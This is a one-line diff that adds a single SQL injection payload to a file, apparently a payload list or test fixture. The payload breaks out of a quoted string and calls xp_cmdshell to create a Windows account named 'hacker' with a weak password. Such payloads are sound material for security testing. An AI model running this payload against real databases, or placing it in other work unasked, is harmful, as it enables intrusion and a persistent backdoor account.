@@ -1,0 +1,1 @@
+' AND 1=1; EXEC xp_cmdshell 'net user hacker WeakPa$$w0rd /ADD'--
